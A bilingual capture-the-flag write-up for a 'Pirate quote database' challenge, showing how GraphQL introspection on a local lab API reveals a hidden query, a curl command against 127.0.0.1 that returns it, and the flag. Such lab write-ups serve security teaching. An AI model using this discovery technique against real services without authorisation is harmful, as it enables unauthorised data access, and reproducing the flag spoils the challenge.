# Pirate quote database

## Write-up (fr)

Le siteweb utilise un API [GraphQL](https://graphql.org/) pour obtenir les citations. Si on utilise la requête d'introspection, il est possible de voir qu'il y a une fonction cachée qui retourne le flag.

Voir [ici](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql#introspection) pour la requête d'introspection.

Utiliser cette requête nous retourne le schéma que l'API GraphQL utilise :

```graphql
### SNIP
      "types": [
        {
          "kind": "OBJECT",
          "name": "Query",
          "description": null,
          "fields": [
            {
              "name": "getQuote",
              "description": null,
              "args": [
                {
                  "name": "index",
                  "description": null,
                  "type": {
                    "kind": "SCALAR",
                    "name": "Int",
                    "ofType": null
                  },
                  "defaultValue": null
                }
              ],
              "type": {
                "kind": "SCALAR",
                "name": "String",
                "ofType": null
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "getRandomQuote",
              "description": null,
              "args": [

              ],
              "type": {
                "kind": "SCALAR",
                "name": "String",
                "ofType": null
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              # vvv On recherche cette requête vvv
              "name": "getSuperDuperMegaSecretQuote",
              "description": null,
              "args": [

              ],
              "type": {
                "kind": "SCALAR",
                "name": "String",
                "ofType": null
              },
              "isDeprecated": false,
              "deprecationReason": null
            }
          ],
          "inputFields": null,
          "interfaces": [

          ],
          "enumValues": null,
          "possibleTypes": null
        },
### SNIP
```

On peut utilise cette requête dans l'API GraphQL pour recevoir le flag.

```bash
# Obtenir le flag en utilisant la requête '{getSuperDuperMegaSecretQuote}'
curl -s 'http://127.0.0.1:4000/graphql?query=%7BgetSuperDuperMegaSecretQuote%7D' | \
 jq -r .data.getSuperDuperMegaSecretQuote
```

## Write-up (en)

The website is using a [GraphQL](https://graphql.org/) API to fetch its quotes. If we use the introspection query, we can see that there is a hidden function which returns the flag.

See [here](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql#introspection) for the introspection query.

Using that query returns us the schema that the GraphQL API is using :

```graphql
# SNIP
      "types": [
        {
          "kind": "OBJECT",
          "name": "Query",
          "description": null,
          "fields": [
            {
              "name": "getQuote",
              "description": null,
              "args": [
                {
                  "name": "index",
                  "description": null,
                  "type": {
                    "kind": "SCALAR",
                    "name": "Int",
                    "ofType": null
                  },
                  "defaultValue": null
                }
              ],
              "type": {
                "kind": "SCALAR",
                "name": "String",
                "ofType": null
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              "name": "getRandomQuote",
              "description": null,
              "args": [

              ],
              "type": {
                "kind": "SCALAR",
                "name": "String",
                "ofType": null
              },
              "isDeprecated": false,
              "deprecationReason": null
            },
            {
              # vvv We are looking for this query vvv
              "name": "getSuperDuperMegaSecretQuote",
              "description": null,
              "args": [

              ],
              "type": {
                "kind": "SCALAR",
                "name": "String",
                "ofType": null
              },
              "isDeprecated": false,
              "deprecationReason": null
            }
          ],
          "inputFields": null,
          "interfaces": [

          ],
          "enumValues": null,
          "possibleTypes": null
        },
# SNIP
```

We can then use this query on the GraphQL API to receive the flag :

```bash
# Get the flag using the query '{getSuperDuperMegaSecretQuote}'
curl -s 'http://127.0.0.1:4000/graphql?query=%7BgetSuperDuperMegaSecretQuote%7D' | \
 jq -r .data.getSuperDuperMegaSecretQuote
```

## Flag

`flag-DoNotForgetToDisableIntrospection`
